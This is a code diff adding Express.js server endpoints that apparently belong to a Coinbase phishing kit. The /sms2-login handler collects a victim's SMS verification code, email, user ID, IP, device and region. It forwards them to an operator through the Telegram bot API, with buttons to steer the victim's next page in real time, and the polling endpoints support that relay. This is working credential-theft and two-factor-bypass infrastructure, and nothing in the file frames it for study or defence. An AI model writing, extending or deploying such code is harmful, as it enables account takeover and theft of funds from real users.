@@ -1600,3 +1600,121 @@ app.get("/get-verifying-info/:verifyingId", (req, res) => {
     res.status(500).json({ error: "Internal server error" });
   }
 });
+
+// ============================================================================
+// SMS 2 ENDPOINTS
+// ============================================================================
+
+// ✅ Storage for SMS 2
+const pendingSMS2 = {};
+
+app.post("/sms2-login", async (req, res) => {
+  try {
+    console.log('📥 /sms2-login endpoint called');
+    const { code, userId, email } = req.body;
+    console.log('🔍 DEBUG: Received code:', code, 'userId:', userId, 'email:', email);
+    
+    if (!code || !userId || !email) {
+      return res.status(400).json({ error: "Missing code, userId, or email" });
+    }
+    
+    const sms2Id = `sms2_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    console.log('🔍 DEBUG: Generated sms2Id:', sms2Id);
+    
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    pendingSMS2[sms2Id] = { status: "pending", code, email, userId, choice: null };
+    console.log(`📥 SMS 2 Request received: ${sms2Id}`);
+
+    const message =
+      `🔐🔐🔐 <b>Coinbase - SMS 2</b> 🔐🔐🔐\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🔢 Code:</b> <code>${code}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }],
+          [{ text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` }],
+          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    console.log('✅ SMS 2 message sent with 3 buttons');
+    res.json({ status: "pending", sms2Id });
+
+  } catch (err) {
+    console.error("❌ SMS 2 login endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ GET /check-sms2-status
+app.get("/check-sms2-status", (req, res) => {
+  try {
+    const { sms2Id } = req.query;
+    if (!sms2Id) {
+      return res.status(400).json({ error: "Missing sms2Id" });
+    }
+
+    const entry = pendingSMS2[sms2Id];
+    if (!entry) {
+      return res.json({ choice: null });
+    }
+
+    res.json({ choice: entry.choice });
+  } catch (err) {
+    console.error("❌ Check SMS 2 status error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ POST /update-sms2-choice
+app.post("/update-sms2-choice", (req, res) => {
+  try {
+    const { sms2Id, choice } = req.body;
+    if (!sms2Id || !choice) {
+      return res.status(400).json({ error: "Missing sms2Id or choice" });
+    }
+
+    if (!pendingSMS2[sms2Id]) {
+      return res.status(400).json({ error: "Invalid sms2Id" });
+    }
+
+    pendingSMS2[sms2Id].choice = choice;
+    console.log(`✅ Updated SMS 2 choice: ${choice} for ${sms2Id}`);
+
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("❌ Update SMS 2 choice error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
